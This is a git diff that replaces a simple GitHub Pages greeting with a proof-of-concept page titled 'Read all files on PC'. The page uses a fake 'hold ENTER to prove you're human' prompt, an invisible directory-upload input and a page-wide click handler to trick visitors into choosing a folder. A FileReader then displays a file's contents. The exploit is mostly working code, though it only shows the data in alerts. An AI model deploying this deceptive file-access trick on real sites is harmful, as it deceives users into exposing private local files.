@@ -1,11 +1,58 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>My GitHub Webpage</title>
+    <title>
+		Read all files on PC - PoC - By @qab
+    </title>
+    <style>
+        #thing {
+            opacity: 0.0;
+        }
+    </style>
 </head>
+
 <body>
-  <h1>Hello from GitHub Pages!</h1>
-  <p>This is my first webpage hosted on GitHub.</p>
+    <h3 id="qmsg">Hold down the ENTER key for 5 seconds to prove you're human..</h3>
+    <input id="thing" type="file" webkitdirectory mozdirectory accept="text/*" />
+<a id="yourLinkID" onclick="myFunction();" href="tel:688" target="_blank" rel="noopener noreferrer">Visit Google</a>
+
+    <script>
+	
+		  var r = new FileReader();
+        thing.onchange = function() {
+            alert('I can read ' + this.files.length + ' files from anywhere on your pc!');//This is for PoC only. We can access all data using this.files as seen next.
+			r.onload=function(){
+				alert(r.result);
+			};
+			
+			r.readAsText(thing.files[0]);
+        };
+		
+		window.onblur=function incognito() {
+
+		}
+		
+function myFunction() {
+
+
+
+
+}
+		
+document.onclick = function(){
+
+
+		 thing.click();
+
+
+
+
+}
+
+		
+		
+        var i = 0;
+  
+    </script>
 </body>
+
 </html>
